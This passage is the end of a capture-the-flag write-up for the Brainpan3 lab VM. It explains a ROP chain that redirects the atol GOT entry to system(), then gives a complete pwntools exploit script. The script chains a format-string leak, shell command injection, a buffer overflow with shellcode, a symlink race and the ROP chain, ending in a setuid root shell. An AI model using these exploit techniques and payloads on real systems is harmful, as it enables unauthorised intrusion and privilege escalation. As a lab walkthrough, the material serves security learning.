__libc_start_main 0x26800
atol 0xe900
```

To make things a bit simpler, we will only be adding positive values to our GOT entry. Let's use the `atol` entry since it has the smallest difference to `system`.

Next we need to find offsets in our binary that when accumulated, equal `0xe900`. One possible list is below:

```
0x8048595 = 0xc6e8
0x8048dff = 0x2203
0x8048833 = 0x14
0x8048fb9 = 0x1
```

Now that we have our `system` offset, we only need one more gadget to execute it.

```
0x8048786 : call eax;
```

We noticed that the string `/tmp/foo` is found in the usage statement. Let's leverage that and use it as our command to execute. We need a command or two that, when executed as `root`, will give us a shell. One way to do this is below:

```
cp /bin/sh /tmp/pwned;
chown root /tmp/pwned;
chmod 4777 /tmp/pwned;
```

We need to set the setuid bit (4777) in order for us, as puck, to execute the binary under root privileges.

The pieces are in place, let's check out our final ROP chain.

```python
def add_offset(addr):
    """Function used to easily add offsets to eax to global rop chain"""
    # 0x08048feb : add eax, dword ptr [ebx + 0x1270304] ; ret.
    add_to_sum = 0x08048feb
    rop.raw(pop_ebx)
    rop.raw(addr - 0x1270304) # Have to subtract the constant as it is added back by the gadget
    rop.raw(add_to_sum)

# Note the binjitsu fun!
rop = ROP(elf) # Create the simple ROP object from msg_admin
tmpfoo = elf.search('/tmp/foo').next()
atol = elf.got['atol']

pop_ebx = 0x804859d
call_eax = 0x8048786

# Offsets found from manual IDA investigation
hex_c6e8 = 0x8048595
hex_2203 = 0x8048dff
hex_14 = 0x8048833
hex_1 = 0x8048fb9.

rop.raw(0x8048790)   # eax = 0

# Add offsets to atol to reach system()
add_offset(atol)     # eax = 0 + atol_addr
add_offset(hex_c6e8) # eax = eax + 0xc6e8
add_offset(hex_2203) # eax = eax + 0x2203
add_offset(hex_14)   # eax = eax + 0x14
add_offset(hex_1)    # eax = eax + 0x1
# eax now contains the address of system()

# call eax with the parameter of /tmp/foo
rop.raw(call_eax)    
rop.raw(tmpfoo)
```

As per the previous challenges, we need to execute these via binjitsu.

```python
# Write our /tmp/foo command
r.sendline('echo "cp /bin/sh /tmp/pwned; chown root /tmp/pwned; chmod 4777 /tmp/pwned" > /tmp/foo')
r.sendline('chmod +x /tmp/foo')

# Overwrite strtok with the pivot gadget
sc = str(rop)
sc += cyclic(cyclic_find('daac')-len(sc))
sc += p32(strtok) # where to overwrite
sc += 'C' * (216 - len(sc))

data = ''
data += '{}|{}\n'.format('s'*4, sc) 
data += '{}|{}\n'.format(p32(pivot), str(rop))

pwnmsg_file = ''
for b in data:
    pwnmsg_file += '\\x{}'.format(b.encode('hex'))

r.sendline('''python -c "print '{}'" >> /opt/.messenger/pwn.msg'''.format(pwnmsg_file))
```

At this point, we think we win. Let's see...

```
[+] Shell received: puck
[*] '/home/ctf/ctfs/brainpan3/msg_admin'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE
[*] Loaded cached gadgets for 'msg_admin'
[*] Wait for your r00t shellz
[*] Bingo!
[*] uid=1001(puck) gid=1004(dev) euid=0(root) groups=0
```

And with that, we win! Thanks much to [@superkojiman](https://twitter.com/superkojiman) for the awesome VM.

## Final exploit video

<script type="text/javascript" src="https://asciinema.org/a/9xak3o6gs2gpss0n3ey5lp2nh.js" id="asciicast-9xak3o6gs2gpss0n3ey5lp2nh" async></script>

## Final exploit

```python

from pwn import *
import string
import random


r = remote('192.168.224.154', 1337)
# Leak stack
# print r.recv()
r.clean()

###
# Get access code
###
r.sendline('%d.' * 3 + 'A' * 80)
r.recvuntil("ACCESS CODE: ")
output = r.recv()
code = output.split('.')[2]

log.info("Code identified: {}".format(code))

r.sendline(code)

log.info("Turning on reporting..")

###
#  Turn on reporting
###

r.sendline('3')
shellcode = '%x.' * 70
r.clean()
r.sendline(shellcode)
r.recvuntil("SESSION: ")
# r.recvuntil("SESSION: ")
"""
['bfba64ac', '104', '252e7825', '78252e78', '2e78252e', '252e7825', '78252e78', '2e78252e', '252e7825', '78252e78', '2e78252e', '252e7825', '78252e78', '2e78252e', '252e7825', '78252e78', '2e78252e', '252e7825', '78252e78', '2e78252e', '252e7825', '78252e78', '2e78252e', '252e7825', '78252e78', '2e78252e', '252e7825', '78252e78', '2e78252e', '252e7825', '78252e78', '2e78252e', '252e7825', '78252e78', '2e78252e', '252e7825', '78252e78', '2e78252e', '252e7825', '78252e78', '2e78252e', '252e7825', '78252e78', '2e78252e', '252e7825', '78252e78', '2e78252e', '252e7825', '78252e78', '2e78252e', '252e7825', '78252e78', '2e78252e', '252e7825', 'ff0a2e78', 'b778bc20', 'bfba65fc', '0', 'b778b000', 'b778bac0', 'b778c898', 'b75df940', 'b76510b5', 'b778bac0', '59', '4e', '59', 'b778b8a0', 'b778b000', 'b778bac0', '\n']
"""

session_name = r.recvuntil('\n').split('.')
# print session_name

n_index = session_name.index('4e')
log.info("Report 'N' at offset {}".format(n_index))

r.sendline('3')
r.sendline('Y' * (4*(n_index-2) + 1) )

###
# After reporting
###

for command in ['whoami', 'id']:
    r.clean()
    r.sendline('1')
    r.sendline('$({} >&2)'.format(command))

    r.recvuntil("SENDING TO REPORT MODULE")
    output = r.recvuntil('[+]').split('\n')[2]
    log.success("{} - {}".format(command, output))

r.clean()
r.sendline('1')
r.sendline('$(/bin/bash -i >&2)')

log.success("Assume the form:")
log.success("anansi")
sleep(1)

offset = cyclic_find('zaab')
shellcode = 'A' * cyclic_find('zaab') + p32(0x804a080)
buffer = 116 - len(shellcode)

binsh_shellcode = asm(shellcraft.sh())

# Build argv1
argv1 = '"A" * {} + "{}" + "C" * {}'.format(offset, r'\x80\xa0\x04\x08', buffer)

# Build argv2
argv2 = ''.join('\\x{}'.format(enhex(binsh_shellcode)[x:x+2]) for x in xrange(0, len(enhex(binsh_shellcode)), 2))

# Final command
actual_shellcode = """./cryptor $(python -c 'print {}') $(python -c 'print "{}"')""".format(argv1, argv2)

log.info(actual_shellcode)

# Sometimes the command didn't work. This will repeat throwing the command until we get a reynard shell.
r.sendline('cd /home/reynard/private')
while True:
    r.clean()
    r.sendline(actual_shellcode)
    r.clean()
    r.sendline('id')
    output = r.recv()
    if 'reynard' in output:
        break

log.success("You are now:")
log.success("reynard")
sleep(1)

r.sendline('id')

r.sendline(""" echo "
import os
import socket
import telnetlib
import subprocess

HOST = 'localhost'
PORT = 7075

try:
    os.remove('/mnt/usb/key.txt')
except:
    pass

# Ensure we have a file to begin with
subprocess.check_output(['touch', '/mnt/usb/key.txt'])

# Connect and check for symlink
r = socket.socket()
r.connect((HOST, PORT))

# Quickly remove the non-symlinked file and re-symlink
os.remove('/mnt/usb/key.txt')
os.symlink('/home/puck/key.txt', '/mnt/usb/key.txt')

# Try for our shellz
t = telnetlib.Telnet()
t.sock = r
t.interact()

r.close()
" > win.py
""")

log.info("Let's hope we win the race.. go go go!")

r.sendline("python win.py")
r.clean()
r.sendline("whoami")
output = r.recv()
log.success("I choose you!:")
log.success(output)


log.success("Insert ROP pun here...")
elf = ELF('msg_admin')
rop = ROP(elf)

pivot = rop.search(move=20).address # Need to move the stack 16 bytes
strtok = elf.got['strtok']
rop = ROP(elf)

def add_offset(addr):
    # 0x08048feb : add eax, dword ptr [ebx + 0x1270304] ; ret 
    add_to_sum = 0x08048feb
    rop.raw(pop_ebx)
    rop.raw(addr - 0x1270304)
    rop.raw(add_to_sum)

tmpfoo = elf.search('/tmp/foo').next()
atol = elf.got['atol']

pop_ebx = 0x804859d
call_eax = 0x8048786

hex_c6e8 = 0x8048595
hex_2203 = 0x8048dff
hex_14 = 0x8048833
hex_1 = 0x8048fb9 

rop.raw(0x8048790) # eax = 0

add_offset(atol)
add_offset(hex_c6e8)
add_offset(hex_2203)
add_offset(hex_14)
add_offset(hex_1)

rop.raw(call_eax)
rop.raw(tmpfoo)

r.sendline('echo "cp /bin/sh /tmp/pwned; chown root /tmp/pwned; chmod 4777 /tmp/pwned" > /tmp/foo')
r.sendline('chmod +x /tmp/foo')
log.info('Create our root command file at /tmp/foo')
log.info('echo "cp /bin/sh /tmp/pwned; chown root /tmp/pwned; chmod 4777 /tmp/pwned" > /tmp/foo')
log.info('chmod +x /tmp/foo')

# Overwrite strtok with the pivot gadget
sc = str(rop)
sc += cyclic(cyclic_find('daac')-len(sc))
sc += p32(strtok) # where to overwrite
sc += 'C' * (216 - len(sc))

data = ''
data += '{}|{}\n'.format('s'*4, sc)
data += '{}|{}\n'.format(p32(pivot), str(rop))

pwnmsg_file = ''
for b in data:
    pwnmsg_file += '\\x{}'.format(b.encode('hex'))

r.sendline('''python -c "print '{}'" >> /opt/.messenger/pwn.msg'''.format(pwnmsg_file))
log.info('Create our malicious msg file')
log.info('''python -c "print '{}'" >> /opt/.messenger/pwn.msg'''.format(pwnmsg_file))

r.sendline('rm /tmp/pwned')

r.clean()

log.info("Wait for your r00t shellz")
for _ in xrange(75):
    r.sendline('ls -la /opt/.messenger')
    sleep(1)
    output = r.recv()
    if 'pwn.msg' not in output:
        break

# Get ROOT shell!
r.sendline('/tmp/pwned')
r.sendline('id')
r.sendline('whoami')

r.sendline('cd /root')
r.sendline('gzip -d brainpan.8.gz')
r.sendline('cat brainpan.8')

for _ in xrange(10):
    r.sendline('')

log.info("Bingo!")
log.info(r.recv())
r.interactive()
```
